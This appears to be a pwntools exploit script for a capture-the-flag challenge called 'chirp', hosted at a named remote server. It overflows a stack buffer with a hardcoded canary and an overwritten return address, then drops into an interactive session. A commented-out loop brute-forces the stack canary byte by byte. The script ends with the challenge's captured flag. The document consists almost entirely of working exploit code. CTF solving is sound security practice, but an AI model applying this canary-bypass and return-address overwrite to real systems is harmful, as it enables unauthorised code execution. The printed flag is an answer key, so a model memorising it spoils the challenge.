#!/usr/bin/env python3
from pwn import *

exe = ELF("./chirp", checksec=False)
# p = process(exe.path)
p = remote('chirp.challs.pwnoh.io', 1337, ssl=True)

canary = 0x9114730499870181
p.sendline(b'A' * 24 + p64(canary) + b'B' * 8 + p64(0x00000000004011b6))

# canary = b""
# #leak_canary
# for i in range(255):
#     if (i == 0x0a):
#         continue

#     p = process(exe.path)
#     payload = b'A' * 24    
#     p.send(payload + canary + bytes([i]))
#     output = p.recvall()
#     if ((b'STACK' in output) == False):
#         canary += bytes([i])
#         print(i)
#         time.sleep(2)
#         break
    
# print(f"Canary: {canary.hex()}")

p.interactive()
#bctf{r3Al_pR0gramm3rs_d0n7_Wr1t3_th31R_0wn_cRypTo}